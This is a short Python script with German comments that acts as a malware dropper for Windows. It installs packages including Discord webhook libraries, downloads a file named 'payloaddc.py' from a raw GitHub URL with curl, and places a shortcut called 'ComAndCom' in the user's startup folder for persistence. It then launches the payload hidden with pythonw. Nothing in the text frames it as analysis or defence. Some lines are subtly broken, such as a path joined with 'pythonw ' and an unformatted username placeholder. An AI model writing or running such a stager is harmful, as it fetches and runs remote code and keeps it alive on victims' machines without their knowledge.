import os
os.system("pip install cryptography")
os.system("pip install discord")
os.system("pip install dhooks")
os.system("pip install hashlib")
os.system("pip install winshell")
os.system("pip install pywin32")


import winshell
from win32com.client import Dispatch
import sys

username = os.getlogin()

if len(sys.argv) > 1:
    argument = sys.argv[1]
    print(f"Das übergebene Argument ist: {argument}")
else:
    sys.exit()

def create_shortcut_to_autostart(script_path, shortcut_name="ComAndCom"):
    # Autostart-Ordner Pfad
    autostart_path = os.path.join("pythonw ", winshell.startup(), f"{shortcut_name}.lnk {argument}")
    
    # Verknüpfung erstellen
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(autostart_path)
    
    # Setze den Pfad zum Python-Skript
    shortcut.TargetPath = script_path
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.IconLocation = script_path  # Optional: Setzt das Symbol des Skripts
    shortcut.save()
    print(f"Shortcut '{shortcut_name}' was created in autostart.")

# Der Pfad zu deinem Python-Skript
script_to_autostart = f"C:\\Users\\{username}\\payloaddc.py"

os.system("cd C:\\Users\\{username} && curl -O https://raw.githubusercontent.com/jkramer5103/stuff/refs/heads/main/payloaddc.py")
create_shortcut_to_autostart(script_to_autostart, "ComAndCom")
os.system(f"pythonw {script_to_autostart} {argument}")